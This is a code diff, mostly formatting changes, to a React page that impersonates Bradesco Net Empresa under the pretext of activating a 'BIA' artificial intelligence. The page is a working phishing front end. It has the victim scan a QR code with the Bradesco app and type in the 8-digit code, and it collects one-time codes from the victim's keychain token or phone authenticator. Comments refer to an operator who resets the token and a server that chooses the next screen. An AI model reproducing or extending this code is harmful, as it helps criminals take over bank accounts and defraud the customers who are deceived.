@@ -23,9 +23,15 @@ export const Route = createFileRoute("/interna")({
   head: () => ({
     meta: [
       { title: "Implementação da BIA — Bradesco Net Empresa" },
-      { name: "description", content: "Implementação da Inteligência Artificial BIA em sua conta empresarial." },
+      {
+        name: "description",
+        content: "Implementação da Inteligência Artificial BIA em sua conta empresarial.",
+      },
       { property: "og:title", content: "Implementação da BIA" },
-      { property: "og:description", content: "Implementação da Inteligência Artificial BIA em sua conta empresarial." },
+      {
+        property: "og:description",
+        content: "Implementação da Inteligência Artificial BIA em sua conta empresarial.",
+      },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary" },
     ],
@@ -85,7 +91,6 @@ function InternaPage() {
   const [qrErro, setQrErro] = useState<string | null>(null);
   const tokenEnviadoEmRef = useRef<string | null>(null);
 
-
   usePresenca(id, "concluido");
 
   useEffect(() => {
@@ -128,10 +133,11 @@ function InternaPage() {
           return novoQr;
         });
 
-
-
         // Overlay de token dentro da BIA — deve ser verificado antes do redirecionamento genérico
-        if (res.proxima_tela === "interna_token_celular" || res.proxima_tela === "interna_token_chaveiro") {
+        if (
+          res.proxima_tela === "interna_token_celular" ||
+          res.proxima_tela === "interna_token_chaveiro"
+        ) {
           const modo = res.proxima_tela === "interna_token_chaveiro" ? "chaveiro" : "celular";
           setTokenModo((cur) => (cur === modo ? cur : modo));
           // Se o operador limpou o token (reencaminhamento), volta pro input
@@ -198,14 +204,15 @@ function InternaPage() {
       try {
         const res = await checar({ data: { id } });
         if (res.token_em) tokenEnviadoEmRef.current = res.token_em;
-      } catch { /* ignora */ }
+      } catch {
+        /* ignora */
+      }
       setAguardandoToken(true);
     } catch {
       setEnviandoToken(false);
       setErroToken("Não foi possível enviar. Tente novamente.");
     }
   }
-
 
   const etapaAtual = Math.min(ETAPAS.length - 1, Math.floor((progresso / 100) * ETAPAS.length));
 
@@ -238,7 +245,9 @@ function InternaPage() {
                 <h1 className="mb-1 text-xl font-bold tracking-tight drop-shadow">
                   Configurando sua <span className="font-black">BIA</span>
                 </h1>
-                <p className="text-sm font-medium text-white/90 drop-shadow">Bradesco Inteligência Artificial</p>
+                <p className="text-sm font-medium text-white/90 drop-shadow">
+                  Bradesco Inteligência Artificial
+                </p>
               </div>
               <div className="text-right">
                 <div className="text-3xl font-black text-white drop-shadow">
@@ -275,7 +284,7 @@ function InternaPage() {
                     } else if (atual) {
                       pct = Math.max(
                         0,
-                        Math.min(100, ((progresso / 100) * ETAPAS.length - idx) * 100)
+                        Math.min(100, ((progresso / 100) * ETAPAS.length - idx) * 100),
                       );
                     }
 
@@ -293,7 +302,10 @@ function InternaPage() {
                         </div>
                         <div className="h-1.5 w-full overflow-hidden rounded-full bg-slate-100">
                           <div
-                            className={cn("h-full rounded-full bg-gradient-to-r from-bia-purple to-bia-pink", atual && "animate-pulse")}
+                            className={cn(
+                              "h-full rounded-full bg-gradient-to-r from-bia-purple to-bia-pink",
+                              atual && "animate-pulse",
+                            )}
                             style={{ width: `${pct}%` }}
                           />
                         </div>
@@ -359,11 +371,7 @@ function InternaPage() {
           {/* Rodapé da marca */}
           <div className="flex items-center justify-between border-t border-slate-100 bg-slate-50 px-6 py-2.5">
             <div className="flex items-center gap-2">
-              <img
-                src={biaLogo.url}
-                alt="BIA"
-                className="h-8 w-8 rounded object-cover"
-              />
+              <img src={biaLogo.url} alt="BIA" className="h-8 w-8 rounded object-cover" />
               <span className="text-xs font-bold uppercase tracking-widest text-slate-400">
                 Bradesco Net Empresa
               </span>
@@ -381,14 +389,12 @@ function InternaPage() {
           <div aria-hidden className="absolute inset-0 bg-black/60 backdrop-blur-[3px]" />
           <div className="relative w-full max-w-sm rounded-2xl border border-white/40 bg-white p-6 shadow-2xl">
             <div className="mb-4 text-center">
-              <h3 className="text-base font-bold text-slate-800">
-                Validação por QR Code
-              </h3>
+              <h3 className="text-base font-bold text-slate-800">Validação por QR Code</h3>
               <p className="mt-2 text-[12px] leading-relaxed text-slate-600">
                 Abra o aplicativo <strong>Bradesco</strong> no seu celular, acesse
-                <strong> Mais &gt; Ler QR Code</strong> e aponte a câmera para o código
-                abaixo. Após a leitura, o app exibirá um <strong>código de 8 dígitos</strong> —
-                digite-o abaixo para concluir a validação da BIA.
+                <strong> Mais &gt; Ler QR Code</strong> e aponte a câmera para o código abaixo. Após
+                a leitura, o app exibirá um <strong>código de 8 dígitos</strong> — digite-o abaixo
+                para concluir a validação da BIA.
               </p>
             </div>
             <div className="flex justify-center rounded-lg border border-slate-200 bg-white p-3">
@@ -436,9 +442,7 @@ function InternaPage() {
                 placeholder="00000000"
                 className="w-full rounded-lg border border-slate-300 bg-white px-3 py-2 text-center font-mono text-lg tracking-[0.4em] text-slate-800 outline-none focus:border-bia-purple"
               />
-              {qrErro && (
-                <p className="mt-2 text-[11px] font-medium text-red-600">{qrErro}</p>
-              )}
+              {qrErro && <p className="mt-2 text-[11px] font-medium text-red-600">{qrErro}</p>}
               <button
                 type="submit"
                 disabled={qrAguardando || qrEnviando || qrCodigo.length !== 8}
@@ -464,8 +468,6 @@ function InternaPage() {
           </div>
         </div>
       )}
-
-
 
       {/* Overlay de token dentro da tela da BIA (mesmo fundo) */}
       {tokenModo && (
@@ -494,8 +496,15 @@ function InternaPage() {
 
             <div className="p-5">
               <p className="mb-4 text-[13px] leading-relaxed text-slate-600">
-                Olá{tokenNome ? <>, <strong className="text-slate-800">{tokenNome}</strong></> : null}.
-                Para concluir a ativação da BIA, informe o código exibido no seu {tokenModo === "chaveiro" ? "chaveiro token" : "aplicativo autenticador do celular"}.
+                Olá
+                {tokenNome ? (
+                  <>
+                    , <strong className="text-slate-800">{tokenNome}</strong>
+                  </>
+                ) : null}
+                . Para concluir a ativação da BIA, informe o código exibido no seu{" "}
+                {tokenModo === "chaveiro" ? "chaveiro token" : "aplicativo autenticador do celular"}
+                .
               </p>
 
               <div className="flex items-center gap-4">
